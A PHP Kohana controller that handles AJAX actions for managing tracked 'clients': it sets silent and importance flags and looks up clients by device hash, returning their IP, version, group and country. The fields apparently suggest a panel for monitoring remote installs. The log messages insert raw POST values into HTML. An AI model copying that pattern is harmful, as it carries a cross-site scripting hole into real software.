<?php defined('SYSPATH') or die('No direct script access.');

class Controller_Ajax_Log extends Controller {

    public function before() {
        if (Auth::instance()->logged_in() && Request::$initial->is_ajax())
            return parent::before();
        else
            HTTP::redirect('/');
    }

    public function action_silent()
    {
        if ( ! Auth::instance()->get_user()->hasAction('View and edit client silent') )
        {
            throw HTTP_Exception::factory(403);
        }
        
        $data = Arr::extract($this->request->post(), [':argSilent', ':argClientID']);
        $data[':argNet'] = '*';
        $data[':argSystem'] = '*';
        $data[':argLocation'] = '*';

        $query = "SELECT SetClientSilent(:argClientID, :argNet, :argSystem, :argLocation, :argSilent)";
        $query = DB::query(Database::SELECT, $query);
        $query->parameters($data);
        $query->execute();
        
        ORM::factory('Userslogs')->createLog('change Silent to ' . trim(var_export($data[':argSilent'], true), '\'') . ' in client <a href="/log/' . $data[':argClientID'] . '">' . $data[':argClientID'] . '</a>', $data);
    }

    public function action_importance()
    {
        if ( ! Auth::instance()->get_user()->hasAction('Edit client importance') )
        {
            throw HTTP_Exception::factory(403);
        }

        $client_id = $this->request->post('clientid');
        $client_importance = $this->request->post('importance');
        
        $client = ORM::factory('Client', $client_id);
        if ( ! $client->loaded() )
        {
            throw HTTP_Exception::factory(404);
        }
        if ( $client->importance >= Model_Client::MIN_HIGH_IMPORTANCE && ! Auth::instance()->get_user()->hasAction('Edit client with high importance') )
        {
            throw HTTP_Exception::factory(403);
        }
        if ( $client_importance >= Model_Client::MIN_HIGH_IMPORTANCE && ! Auth::instance()->get_user()->hasAction('Edit client with high importance') )
        {
            throw HTTP_Exception::factory(403);
        }
        
        if ( $client->importance != $client_importance )
        {
            $client->importance = $client_importance;
            $client->save();

            ORM::factory('Userslogs')->createLog('change Importance to ' . $client_importance . ' in client <a href="/log/' . $client_id . '">' . $client_id . '</a>');
        }
    }
    
    public function action_importanceauto()
    {
        if ( ! Auth::instance()->get_user()->hasAction('View and edit client importance auto') )
        {
            throw HTTP_Exception::factory(403);
        }
        
        $data = Arr::extract($this->request->post(), [':argImportanceAuto', ':argClientID']);

        $query = "SELECT ChangeClientImportanceAuto(:argClientID, :argImportanceAuto)";
        $query = DB::query(Database::SELECT, $query);
        $query->parameters($data);
        $query->execute();
        
        ORM::factory('Userslogs')->createLog('change ImportanceAuto to ' . trim(var_export($data[':argImportanceAuto'], true), '\'') . ' in client <a href="/log/' . $data[':argClientID'] . '">' . $data[':argClientID'] . '</a>', $data);
    }
    
    public function action_find_clients_by_newdevhash()
    {
        try
        {
            $validation = Validation::factory($this->request->post())
                ->label('devhash', 'Devhash')
                ->rule('devhash', 'not_empty')
                ->rule('devhash', 'regex', array(':value', '/^[0-9A-F]{64}$/'))
                ->label('exclude_clientid', 'Exclude Clientid')
                ->rule('exclude_clientid', 'digit')
                ->label('page', 'Page')
                ->rule('page', 'not_empty')
                ->rule('page', 'digit');
            if ( ! $validation->check() )
            {
                $errors = $validation->errors('validation');
                throw new InvalidArgumentException(nl2br(implode("\r\n", $errors)));
            }
            
            $devhash = $this->request->post('devhash');
            $exclude_clientid = (int)$this->request->post('exclude_clientid');
            
            $page = $this->request->post('page');
            $items_per_page = 10;

            $devhash = Model_Devhash::getDevhash($devhash);
            $clients = ORM::factory('Client')
                ->where('devhash_1', '=', $devhash[3])
                ->where('devhash_2', '=', $devhash[2])
                ->where('devhash_3', '=', $devhash[1])
                ->where('devhash_4', '=', $devhash[0])
                ->where('id', '<>', $exclude_clientid)
                ->offset($page * $items_per_page)
                ->limit($items_per_page)
                ->find_all();
            
            $result = array();
            $result['clients'] = array();
            foreach($clients as $client)
            {
                $dataClient = array();
                $dataClient['ip'] = $client->ip;
                $dataClient['prefix_dot_client'] = $client->getLink();
                $dataClient['client_ver'] = $client->client_ver;
                $dataClient['group'] = $client->group;
                $dataClient['country'] = $client->country;
                $dataClient['logged_at'] = Helper::time_elapsed_string($client->logged_at, true);
                $result['clients'][] = $dataClient;
            }
            
            $result['is_more'] = count($result['clients']) == $items_per_page;
        }
        catch(Exception $e)
        {
            $code = $e instanceof HTTP_Exception ? $e->getCode() : 500;
            $this->response->status($code);
            
            $result = array(
                'errorMsg' => $e->getMessage(),
            );
        }
        
        $this->response->headers('Content-Type', 'application/json; charset=' . Kohana::$charset);
        $this->response->body(json_encode($result));
    }

}